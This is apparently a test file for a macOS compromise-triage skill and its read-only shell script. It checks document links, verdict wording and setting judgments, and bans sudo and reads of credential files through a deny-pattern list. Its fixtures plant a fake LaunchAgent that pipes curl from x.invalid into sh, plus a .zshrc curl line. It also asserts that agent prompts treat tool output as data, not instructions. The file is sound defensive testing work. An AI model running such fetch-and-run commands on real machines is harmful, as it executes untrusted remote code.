import { spawn, spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, test } from 'vitest';

/**
 * Guards the am-i-pwned skill (docs/am-i-pwned): its files point at each other, its script keeps the skill's own rules
 * (read-only, no sudo, no secrets), and the two audiences' verdict words are the same everywhere they are written.
 */
const DIR = path.resolve(__dirname, '..', 'docs', 'am-i-pwned');
const read = (f: string): string => fs.readFileSync(path.join(DIR, f), 'utf8');
const SCRIPT = path.join(DIR, 'mac-triage.sh');
const present = fs.existsSync(DIR);

const FILES = ['SKILL.md', 'paste-prompts.md', 'CHANGES.md', ...(present ? fs.readdirSync(path.join(DIR, 'references')).map(f => `references/${f}`) : [])];

describe.skipIf(!present)('am-i-pwned skill', () => {
  test('every file it names in backticks exists', () => {
    for (const f of FILES) {
      const dir = path.dirname(path.join(DIR, f));
      for (const m of read(f).matchAll(/`((?:\.\.\/)?(?:references\/)?[A-Za-z0-9._-]+\.(?:md|sh))`/g)) {
        const target = m[1]!;
        // CHANGES.md talks about files that are not in the skill (the Nov 4 prompt, README).
        if (f === 'CHANGES.md' && !fs.existsSync(path.join(dir, target)) && !/^(references\/|mac-triage|SKILL|paste-prompts)/.test(target)) continue;
        const candidates = [path.join(dir, target), path.join(DIR, target)];
        expect(candidates.some(c => fs.existsSync(c)), `${f} names ${target}`).toBe(true);
      }
    }
  });

  test('the skill has the front matter a skill needs, and names macOS', () => {
    const head = /^---\nname: am-i-pwned\ndescription: ([^\n]+)\n---\n/.exec(read('SKILL.md'));
    expect(head).not.toBeNull();
    expect(head![1]).toContain('Mac');
  });

  test('both audiences use the same verdict words in the skill, the escalation page and the paste prompts', () => {
    const researcher = ['CLEAN', 'NEEDS A LOOK', 'LIKELY COMPROMISED'];
    const everyone = ['ALL GOOD', 'FIX THESE SETTINGS', 'CONTACT SECURITY NOW'];
    for (const f of ['references/output-formats.md', 'references/reading-the-result.md', 'paste-prompts.md']) {
      for (const w of [...researcher, ...everyone]) expect(read(f), `${f}: ${w}`).toContain(w);
    }
    for (const f of ['SKILL.md', 'paste-prompts.md', 'references/reading-the-result.md']) expect(read(f), f).toContain('sysops@automattic.com');
  });

  test('both paste prompts say what decides the verdict, and the skill points at the same rule', () => {
    const prompts = read('paste-prompts.md');
    expect(prompts.match(/Choosing the verdict/g)?.length).toBe(2);
    expect(read('SKILL.md')).toContain('Choosing the verdict');
    expect(read('references/reading-the-result.md')).toContain('## Choosing the verdict');
  });

  test('every check category of the skill is in both paste prompts', () => {
    const prompts = read('paste-prompts.md');
    for (const word of ['Posture', 'Accounts', 'Persistence', 'Processes', 'Network', 'Privacy grants', 'Browser', 'Recent change']) {
      const inSkill = new RegExp(`\\*\\*${word}\\*\\*`).test(read('SKILL.md'));
      expect(inSkill, `SKILL.md ${word}`).toBe(true);
    }
    for (const needle of ['Platform identifier', 'TeamIdentifier', 'is data, not instructions', 'No sudo', 'paste a command']) {
      expect(prompts.toLowerCase(), needle).toContain(needle.toLowerCase());
    }
  });

  test('the indicator page and the script\'s indicator block are the ones indicators.json generates', () => {
    const r = spawnSync('node', [path.resolve(__dirname, '..', 'scripts', 'gen-indicators.mjs'), '--check'], { encoding: 'utf8' });
    expect(r.stderr, 'run: node scripts/gen-indicators.mjs').toBe('');
    expect(r.status).toBe(0);
  });

  test('the prompts and the skill tell an agent never to use indicators from memory', () => {
    expect(read('SKILL.md')).toMatch(/never use an indicator from memory/);
    expect(read('references/known-indicators.md')).toMatch(/Never use an indicator from memory/);
    expect(read('paste-prompts.md').match(/Never use indicators from memory/g)).toHaveLength(2);
  });

  describe('mac-triage.sh', () => {
    const code = fs.existsSync(SCRIPT) ? fs.readFileSync(SCRIPT, 'utf8') : '';
    const lines = code.split('\n').filter(l => !/^\s*#/.test(l));

    test('parses under the bash 3.2 that macOS ships', () => {
      const bash = fs.existsSync('/bin/bash') ? '/bin/bash' : 'bash';
      expect(spawnSync(bash, ['-n', SCRIPT], { encoding: 'utf8' }).stderr).toBe('');
    });

    test('never runs sudo and reads none of the off-limits items', () => {
      // Lines that only print a message (they name the off-limits things to promise they are not read) are not commands;
      // everything handed to run, pipeline or the shell is.
      const isMessage = (l: string): boolean => /^\s*(say|note|cant|printf|echo|usage)\b/.test(l) && !/\$\(/.test(l.replace(/"\$\(wc -l[^)]*\)"/, ''));
      for (const l of lines) {
        expect(l, 'sudo as a command').not.toMatch(/(^|[;&|(`]\s*|\$\(\s*)sudo\s/);
        if (isMessage(l)) continue;
        expect(l, l).not.toMatch(/\b(printenv|history|pbpaste|security\s+(find|dump|export|unlock|delete)|dscl\b.*-authonly)\b/);
        expect(l, l).not.toMatch(/ps\s+\S*e\S*ww|\bps\s+-[a-z]*e/);   // environment of processes
        expect(l, l).not.toMatch(/\.ssh|\.aws|\.kube|\.npmrc|\.docker|\.gnupg|Login Data|Cookies|Keychains|1password|\.env\b/i);
        // Nothing on the machine is changed. The two exceptions are the script's own files: its temporary capture of one
        // command's output, and the mode of its report.
        if (l.trim() === 'rm -f "$tmp"' || l.trim() === 'chmod 600 "$OUT" 2>/dev/null') continue;
        expect(l, l).not.toMatch(/(^|\s)(rm|mv|kill|pkill|chmod|chown|launchctl\s+(unload|bootout|remove|load|bootstrap)|defaults\s+(write|delete)|tmutil|killall)\s/);
      }
    });

    test('a process command line only ever passes through a grep that keeps the flag', () => {
      for (const l of lines.filter(x => /ps\s+-axo\s+command/.test(x))) expect(l).toMatch(/grep\s+-o/);
    });

    test('refuses to run as root and not to overwrite a report', () => {
      expect(code).toMatch(/id -u\)" != 0/);
      expect(code).toMatch(/already exists; not overwriting/);
    });

    /** A judging function of the script, called with `args` (the script is sourced, not run). */
    const judge = (fn: string, ...args: string[]): string =>
      spawnSync('/bin/bash', ['-c', 'MAC_TRIAGE_SOURCE_ONLY=1 . "$0"; "$@"', SCRIPT, fn, ...args], { encoding: 'utf8' }).stdout.trim();

    test('judges the firewall, Gatekeeper and SIP from what the tools print', () => {
      expect(judge('judge_firewall', 'Firewall is enabled. (State = 1)')).toBe('ok');
      expect(judge('judge_firewall', 'Firewall is enabled. (State = 2)')).toBe('ok');
      expect(judge('judge_firewall', 'Firewall is disabled. (State = 0)')).toBe('CHANGED');
      expect(judge('judge_firewall', 'something else')).toBe('unknown');
      expect(judge('judge_spctl', 'assessments enabled')).toBe('ok');
      expect(judge('judge_spctl', 'assessments disabled')).toBe('CHANGED');
      expect(judge('judge_sip', 'System Integrity Protection status: enabled.')).toBe('ok');
      expect(judge('judge_sip', 'System Integrity Protection status: disabled.')).toBe('CHANGED');
      expect(judge('judge_sip', 'System Integrity Protection status: enabled (Custom Configuration).')).toBe('CHANGED');
      expect(judge('judge_sip', 'Authenticated Root status: enabled')).toBe('ok');
      expect(judge('judge_sip', 'Authenticated Root status: disabled')).toBe('CHANGED');
    });

    test('judges boot arguments, library validation values, the XProtect age and the SSH settings', () => {
      expect(judge('judge_bootargs', '')).toBe('ok');
      expect(judge('judge_bootargs', '-v debug=0x144')).toBe('note');                       // a developer's flags are not a weakening
      expect(judge('judge_bootargs', 'amfi_get_out_of_my_way=1')).toBe('CHANGED');
      expect(judge('judge_bootargs', '-v cs_enforcement_disable=1')).toBe('CHANGED');
      expect(judge('judge_age', '11')).toBe('ok');
      expect(judge('judge_age', '60')).toBe('ok');
      expect(judge('judge_age', '61')).toBe('CHANGED');
      expect(judge('judge_sshd', '')).toBe('ok');
      expect(judge('judge_sshd', 'PasswordAuthentication no')).toBe('note');
      expect(judge('judge_sshd', 'PermitRootLogin yes')).toBe('CHANGED');
      expect(judge('judge_sshd', 'PermitRootLogin prohibit-password\nForceCommand /tmp/x')).toBe('CHANGED');
      for (const [fn, v, want] of [['is_off', '0', 0], ['is_off', 'false', 0], ['is_off', 'NO', 0], ['is_off', '1', 1], ['is_on', '1', 0], ['is_on', 'true', 0], ['is_on', '0', 1]] as const) {
        expect(spawnSync('/bin/bash', ['-c', 'MAC_TRIAGE_SOURCE_ONLY=1 . "$0"; "$@"', SCRIPT, fn, v]).status, `${fn} ${v}`).toBe(want);
      }
    });

    test('judges an authorization right: the usual admin rights are fine, a loosened one is not', () => {
      const usual = '{"class":"user","group":"admin","authenticate-user":true,"shared":false,"allow-root":true}';
      expect(judge('judge_authdb', usual)).toBe('ok');
      expect(judge('judge_authdb', '{"class":"rule","rule":["is-root","entitled","authenticate-admin-nonshared"]}')).toBe('ok');
      expect(judge('judge_authdb', '{"class":"allow"}')).toBe('CHANGED');
      expect(judge('judge_authdb', '{"class":"rule","rule":"allow"}')).toBe('CHANGED');
      expect(judge('judge_authdb', '{"class":"rule","rule":["allow"]}')).toBe('CHANGED');
      expect(judge('judge_authdb', '{"class":"user","group":"admin","authenticate-user":false}')).toBe('CHANGED');   // no password asked
      expect(judge('judge_authdb', '{"class":"user","group":"everyone","authenticate-user":true}')).toBe('CHANGED'); // a wider group
      expect(judge('judge_authdb', '')).toBe('unknown');
    });

    test('a command that does not finish is stopped, and reported as a failure of that check only', () => {
      const t0 = Date.now();
      const r = spawnSync('/bin/bash', ['-c', 'MAC_TRIAGE_SOURCE_ONLY=1 . "$0"; tmo 1 sleep 20; echo "rc=$?"', SCRIPT], { encoding: 'utf8', timeout: 15_000 });
      expect(r.stdout.trim()).toBe('rc=142');
      expect(Date.now() - t0).toBeLessThan(10_000);
    });

    test('every setting the script reads is explained on the settings page', () => {
      const page = read('references/security-settings.md');
      for (const key of ['AutomaticCheckEnabled', 'ConfigDataInstall', 'CriticalUpdateInstall', 'AutomaticDownload', 'AutomaticallyInstallMacOSUpdates',
        'GKAutoRearm', 'LSQuarantine', 'DisableLibraryValidation', 'boot-args', 'authorizationdb', 'Admin.plist', 'XProtect.yara', 'print-disabled',
        'autoLoginUser', 'GuestEnabled', 'sshd_config', 'csrutil authenticated-root', 'socketfilterfw']) {
        expect(code, `script reads ${key}`).toContain(key);
        expect(page, `page explains ${key}`).toContain(key);
      }
    });

    /** The awk that places a program (`function tooling` … `BEGIN`), run on its own over some paths. */
    const placeOf = (paths: string[]): string[] => {
      const from = code.indexOf('function tooling');
      const fns = code.slice(from, code.indexOf('$1 == "R" {', from));
      const prog = `${fns}\n{ print place($0) }`;
      return spawnSync('awk', [prog], { input: paths.join('\n'), encoding: 'utf8' }).stdout.trimEnd().split('\n');
    };

    test('places a program as Ficus does: strong odd places, developer tooling, and elsewhere', () => {
      expect(placeOf([
        '/tmp/x', '/private/var/folders/ab/cd/T/x', '/var/tmp/x', '/Users/Shared/x', '/Volumes/Disk/x', '/Users/bob/Downloads/x',
        '/private/var/folders/ab/cd/T/AppTranslocation/ABC/d/x.app/Contents/MacOS/x',
        '/Users/bob/.cache/uv/x/bin/python', '/Users/bob/.vscode/extensions/e/bin/pet', '/Users/bob/.cargo/bin/rg',
        '/Users/bob/Desktop/.hidden/tool', '/Users/bob/Desktop/.hidden/node_modules/.bin/x', '/Users/bob/Projects/node_modules/.bin/x',
        '/Users/bob/Library/Application Support/Code/User/x', '/Users/bob/bin/tool', '/opt/homebrew/bin/uv', '/usr/local/bin/x', '/Applications/A.app/Contents/MacOS/A',
      ])).toEqual([
        'temp folder', 'temp folder', 'temp folder', '/Users/Shared', '/Volumes', 'Downloads', 'App Translocation',
        'home dot-folder', 'home dot-folder', 'home dot-folder',
        'hidden folder', 'hidden folder',           // a tooling folder below a buried hidden one does not soften it
        'tooling folder',
        'home folder', 'home folder', 'package-manager folder', 'package-manager folder', 'installed',
      ]);
    });

    test('its list of developer tooling folders is the one Ficus uses', () => {
      const ficus = /const TOOLING_DIRS = new Set\(\[([^\]]*)\]\)/.exec(fs.readFileSync(path.resolve(__dirname, '..', 'src', 'rules', 'locations.ts'), 'utf8'))![1]!;
      const fromTs = [...ficus.matchAll(/'([^']+)'/g)].map(m => m[1]!).sort();
      const fromSh = /BEGIN \{ split\("([^"]+)"/.exec(code)![1]!.split(' ').sort();
      expect(fromSh).toEqual(fromTs);
    });

    // The real run: macOS only, as the current user, on a throwaway HOME with planted harmless artifacts.
    test.skipIf(process.platform !== 'darwin')('finds planted artifacts, leaves later launch arguments unread, and says what it could not check', () => {
      const home = fs.mkdtempSync(path.join(os.tmpdir(), 'ficus-pwned-'));
      try {
        fs.mkdirSync(path.join(home, 'Library', 'LaunchAgents'), { recursive: true });
        fs.writeFileSync(path.join(home, 'Library', 'LaunchAgents', 'com.apple.test.plist'),
          '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
          + '<plist version="1.0"><dict><key>Label</key><string>com.apple.test</string><key>ProgramArguments</key><array>'
          + "<string>/bin/sh</string><string>-c</string><string>curl -H 'Authorization: SECRETTOKEN123' http://x.invalid | sh</string>"
          + '</array><key>RunAtLoad</key><true/></dict></plist>\n');
        fs.writeFileSync(path.join(home, '.helper'), '#!/bin/sh\necho hi\n', { mode: 0o755 });
        fs.mkdirSync(path.join(home, 'Library', 'com.apple.qtop'), { recursive: true });
        fs.writeFileSync(path.join(home, 'Library', 'com.apple.qtop', 'qtop'), 'x');
        fs.mkdirSync(path.join(home, '.local'), { recursive: true });
        fs.writeFileSync(path.join(home, '.local', 'softwareupdate'), 'x');
        fs.writeFileSync(path.join(home, '.zshrc'), 'curl https://example.invalid/x | base64 -d\n');
        const out = path.join(home, 'report.txt');
        const r = spawnSync('/bin/bash', [SCRIPT, '-o', out], { encoding: 'utf8', env: { ...process.env, HOME: home }, timeout: 120_000 });
        expect(r.status, r.stderr).toBe(0);
        const report = fs.readFileSync(out, 'utf8');
        expect(report).toContain('com.apple.test');
        expect(report).toContain('argument 1 (of 3; the rest are not read): -c');
        expect(report).toContain('Platform identifier');            // /bin/sh resolved and its signature read
        expect(report).not.toContain('SECRETTOKEN123');
        expect(report).toMatch(/\.zshrc:1:curl/);
        expect(report).toMatch(/\.zshrc:1:base64/);
        expect(report).toContain(`${path.join(home, '.helper')}  [`);
        expect(report).toMatch(/MATCH \[high\] ChillyHell: .*\/Library\/com\.apple\.qtop \(/);
        expect(report).toMatch(/MATCH \[high\] DazzleSpy: .*\/\.local\/softwareupdate \(/);
        expect(report).not.toContain('(no published indicator found)');
        expect(report).toContain('security settings that malware and adware switch off');
        for (const name of ['Application firewall', 'Gatekeeper', 'System Integrity Protection', 'Boot arguments', 'XProtect signatures last updated', 'Authorization right system.privilege.admin']) {
          expect(report, name).toMatch(new RegExp(`\\n {2}(ok|CHANGED|note|default|info|unknown) +${name}`));   // whatever this Mac's values are
        }
        expect(report).toContain('end of report');
        expect((fs.statSync(out).mode & 0o777).toString(8)).toBe('600');
        // A second run does not overwrite the first.
        const again = spawnSync('/bin/bash', [SCRIPT, '-o', out], { encoding: 'utf8', env: { ...process.env, HOME: home } });
        expect(again.status).toBe(1);
      } finally {
        fs.rmSync(home, { recursive: true, force: true });
      }
    }, 150_000);

    test.skipIf(process.platform !== 'darwin')('lists an ad-hoc program running from a temp folder, and one claiming an Apple identifier', async () => {
      const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ficus-sig-'));
      const kids: ReturnType<typeof spawn>[] = [];
      try {
        const plant = (name: string, id: string | null): void => {
          const file = path.join(dir, name);
          fs.copyFileSync('/bin/sleep', file);
          expect(spawnSync('codesign', ['-f', '-s', '-', ...(id ? ['-i', id] : []), file], { encoding: 'utf8' }).status).toBe(0);
          kids.push(spawn(file, ['120'], { stdio: 'ignore', detached: true }));
        };
        plant('adhoc-tool', null);
        plant('softwareupdated', 'com.apple.softwareupdated');
        const out = path.join(dir, 'report.txt');
        const home = fs.mkdtempSync(path.join(os.tmpdir(), 'ficus-sig-home-'));
        const r = spawnSync('/bin/bash', [SCRIPT, '-o', out], { encoding: 'utf8', env: { ...process.env, HOME: home }, timeout: 120_000 });
        expect(r.status, r.stderr).toBe(0);
        const report = fs.readFileSync(out, 'utf8');
        const line = (name: string): string => report.split('\n').find(l => l.includes(`/${name}  (`)) ?? '';
        expect(line('adhoc-tool')).toMatch(/^ {2}LOOK {3} ad-hoc signed, temp folder: /);
        expect(line('softwareupdated')).toMatch(/^ {2}LOOK {3} ad-hoc signed, temp folder: .*CLAIMS AN APPLE IDENTIFIER/);
        expect(report).toMatch(/Apple platform \d+, developer team \d+, ad-hoc \d+, signed with no team ID \d+, unsigned \d+, unreadable \d+ \(of \d+\)/);
        expect(report).toContain('(read, not verified)');
        fs.rmSync(home, { recursive: true, force: true });
      } finally {
        for (const k of kids) { try { process.kill(-k.pid!, 'SIGKILL'); } catch { try { k.kill('SIGKILL'); } catch { /* already gone */ } } }
        fs.rmSync(dir, { recursive: true, force: true });
      }
    }, 150_000);
  });
});
